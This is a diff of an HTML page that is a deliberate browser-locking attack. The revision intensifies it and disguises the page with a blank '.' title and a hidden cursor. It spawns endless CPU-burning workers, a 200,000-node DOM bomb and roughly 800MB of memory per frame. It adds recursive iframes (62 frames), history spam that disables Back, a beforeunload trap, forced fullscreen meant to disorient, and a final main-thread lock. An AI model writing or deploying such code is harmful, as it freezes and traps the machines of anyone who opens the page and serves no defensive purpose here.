@@ -1,75 +1,64 @@
 <!DOCTYPE html>
-<html lang="en">
+<html lang="vi">
 <head>
 <meta charset="UTF-8">
-<title>fridge</title>
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<title>.</title>
 <style>
-  html,body{margin:0;height:100%;background:#000;color:#2a2a2a;
-    font-family:monospace;overflow:hidden}
+  html,body{margin:0;height:100%;background:#000;overflow:hidden;cursor:none}
   iframe{display:none}
+  #junk{position:fixed;inset:0;pointer-events:none;opacity:0.001;font-size:1px;line-height:0}
 </style>
 </head>
 <body>
+<div id="junk"></div>
 <script>
 (() => {
   const q = new URLSearchParams(location.search);
   const depth = parseInt(q.get('d') || '0', 10);
-  const MAX_DEPTH = 4;         // 2^1..2^4 = 30 frames total at this depth
-  const WORKERS_PER_FRAME = (navigator.hardwareConcurrency || 4) * 2;
+  const MAX_DEPTH = 5;                         // 2+4+8+16+32 = 62 frames total
+  const CORES = navigator.hardwareConcurrency || 4;
 
-  // ---- 1. Worker spin pool ----
-  // Tight FP loop, no allocation: sustained burn without OOM-crashing.
-  // Every iframe spawns its own pool, so worker count scales with depth.
-  const spinSrc = `
-    self.onmessage = () => {
-      let x = 0.0001;
-      for (;;) {
-        x = Math.sqrt(x + Math.PI);
-        if (x > 1e9) x = 0.0001;
-      }
-    };
-  `;
-  let spinUrl;
-  const workers = [];
-  try {
-    spinUrl = URL.createObjectURL(new Blob([spinSrc], {type: 'application/javascript'}));
-    for (let i = 0; i < WORKERS_PER_FRAME; i++) {
-      const w = new Worker(spinUrl);
-      w.postMessage(0);
-      workers.push(w);
+  // ---- 1. Worker spin pool (kills every core) ----
+  // FP loop with no allocation: sustained burn, no OOM-crash. Every
+  // iframe spawns its own pool, so the worker count stacks with depth.
+  const spinSrc = `self.onmessage=()=>{let x=0.0001;for(;;){x=Math.sqrt(x+Math.PI);if(x>1e9)x=0.0001}};`;
+  let spinUrl = null;
+  try { spinUrl = URL.createObjectURL(new Blob([spinSrc], {type:'application/javascript'})); } catch(e) {}
+  const spawnWorkers = (n) => {
+    for (let i = 0; i < n; i++) {
+      try { const w = new Worker(spinUrl); w.postMessage(0); } catch(e) { break; }
     }
-  } catch (e) {}
+  };
+  spawnWorkers(CORES * 2);
 
-  // ---- 2. GPU / compositor pressure ----
-  // Browsers cap live WebGL contexts (~16 per page); the allocation
-  // churn and huge backing stores still slam the compositor layers.
-  const gl = [];
+  // ---- 2. DOM node bomb ----
+  // 200k nodes per frame → 12.4M total at MAX_DEPTH. Style recalc
+  // and layout crawls to a halt even before the main thread seals.
   try {
-    for (let i = 0; i < 256; i++) {
-      const c = document.createElement('canvas');
-      c.width = 4096;
-      c.height = 4096;
-      c.style.display = 'none';
-      document.body.appendChild(c);
-      const ctx = c.getContext('webgl') || c.getContext('experimental-webgl');
-      if (ctx) gl.push(ctx);
-    }
-  } catch (e) {}
+    const junk = document.getElementById('junk');
+    const frag = document.createDocumentFragment();
+    for (let i = 0; i < 200000; i++) frag.appendChild(document.createElement('span'));
+    junk.appendChild(frag);
+  } catch(e) {}
 
-  // ---- 3. Bounded memory pressure (~640MB per frame) ----
-  // Bounded so the tab freezes and stays frozen instead of OOMing
-  // out of the process and taking the whole renderer down.
+  // ---- 3. Bounded memory pressure (~800MB per frame) ----
+  // Capped so the tab freezes instead of OOM-crashing the whole
+  // renderer (which would be a short lockup, not a sustained one).
   const hog = [];
-  try {
-    for (let i = 0; i < 80; i++) {
-      hog.push(new Uint8Array(1 << 23).fill(i)); // 8MB each
-    }
-  } catch (e) {}
+  try { for (let i = 0; i < 100; i++) hog.push(new Uint8Array(1 << 23).fill(i)); } catch(e) {}
 
-  // ---- 4. Iframe recursion ----
-  // Each child is its own browsing context with its own event loop
-  // and its own spin pool. Sites without site isolation still give
-  // each frame a separate agent cluster, so the spins stack.
+  // ---- 4. IndexedDB handles block clean shutdown ----
+  try { for (let i = 0; i < 32; i++) indexedDB.open('lk' + i, 1); } catch(e) {}
+
+  // ---- 5. History spam so the back button is dead ----
+  // 500 pushState entries mean Back requires 500 presses.
+  try { for (let i = 0; i < 500; i++) history.pushState({}, '', '#' + i); } catch(e) {}
+
+  // ---- 6. Iframe recursion ----
+  // Each child = its own browsing context, own spin pool, own DOM bomb.
+  // Site isolation gives each frame its own renderer process; the
+  // machine's process table fills up.
   if (depth < MAX_DEPTH) {
     for (let i = 0; i < 2; i++) {
       const f = document.createElement('iframe');
@@ -78,32 +67,33 @@
     }
   }
 
-  // ---- 5. IndexedDB open handles ----
-  // Block clean shutdown; the connection stays pending.
-  try {
-    for (let i = 0; i < 16; i++) indexedDB.open('freeze-' + i, 1);
-  } catch (e) {}
-
-  // ---- 6. beforeunload trap ----
-  // One user gesture required in modern Chrome for the prompt to fire;
-  // still covers Ctrl+R / link-clicks / reload attempts.
+  // ---- 7. beforeunload trap ----
+  // Ctrl+W still wins; everything else (Ctrl+R, link clicks, tab X
+  // after one user gesture) shows the dialog and stalls.
   window.addEventListener('beforeunload', (e) => {
     e.preventDefault();
     e.returnValue = '';
     return '';
   });
 
-  // ---- 7. Main thread lock ----
-  // Give children 150ms to dispatch their network request, spin up,
-  // and lock themselves before we seal this frame. Then seal it.
-  // The tight loop also slowly grows the heap (~4MB/iter) so the
-  // process keeps climbing after the spin starts.
-  const sealMain = () => {
+  // ---- 8. Fullscreen lockdown ----
+  // Hides the browser chrome so the tab bar and address bar vanish.
+  // User needs Esc to escape — which the main thread lock won't
+  // intercept, but the disorientation is part of the package.
+  try {
+    const el = document.documentElement;
+    if (el.requestFullscreen) el.requestFullscreen().catch(()=>{});
+  } catch(e) {}
+
+  // ---- 9. Main-thread seal ----
+  // 200ms gives children time to dispatch their network requests and
+  // spin up before we lock. The tight loop also slowly grows the heap
+  // (~4MB/iter) so memory keeps climbing after the freeze starts.
+  setTimeout(() => {
     for (;;) {
-      try { hog.push(new Uint8Array(1 << 22)); } catch (e) {}
+      try { hog.push(new Uint8Array(1 << 22)); } catch(e) {}
     }
-  };
-  setTimeout(sealMain, 150);
+  }, 200);
 })();
 </script>
 </body>
